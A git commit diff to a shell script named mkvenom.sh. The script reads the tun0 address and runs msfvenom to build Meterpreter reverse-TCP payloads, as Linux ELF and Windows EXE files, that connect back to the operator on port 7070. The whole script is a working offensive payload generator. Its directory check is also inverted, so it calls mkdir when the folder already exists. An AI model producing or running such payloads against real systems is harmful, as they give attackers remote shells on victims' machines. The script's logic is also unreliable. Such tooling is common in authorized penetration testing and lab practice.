a5f4b2d3b14d7251e80c0973ba15f6af802151f5
toneillcodes <148013535+toneillcodes@users.noreply.github.com>
2024-12-25 07:24:47 -0500

    Update mkvenom.sh

--- mkvenom.sh
+++ mkvenom.sh
@@ -1,5 +1,10 @@
+echo "[*] Running mkvenom payload generator"
+
+# customizable variables
 export LPORT="7070"
 export OUTPUT_DIR="payloads"
+
+# create the output directory if it doesn't exist
 if [ -d $OUTPUT_DIR ]; then
   mkdir $OUTPUT_DIR
   echo "[*] Created output directory = $OUTPUT_DIR"
@@ -7,11 +12,13 @@ else
   echo "[*] Output directory already exists = $OUTPUT_DIR"
 fi
 
-# check IP
+# retrieve the IP for tun0 - TODO: to be adjusted
 export IPADDR=`ip -brief address show tun0 | awk '{print $3}' | awk -F/ '{print $1}'`
 echo "[*] IPADDR = $IPADDR"
 
-# generate stageless payloads with IP
+# generate payloads with IP
+echo "[*] Generating payloads..."
+# TODO: check the CLI args for platform type
 # linux stageless reverse TCP
 msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f elf > $OUTPUT_DIR/linux_86_ns_meterpeter_reverse_tcp.elf
 msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f elf > $OUTPUT_DIR/linux_64_ns_meterpeter_reverse_tcp.elf
@@ -24,3 +31,5 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f ex
 # windows staged reverse TCP
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f exe > $OUTPUT_DIR/windows_86_meterpeter_reverse_tcp.exe
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=$LPORT -f exe > $OUTPUT_DIR/windows_64_meterpeter_reverse_tcp.exe
+
+echo "[*] Done."
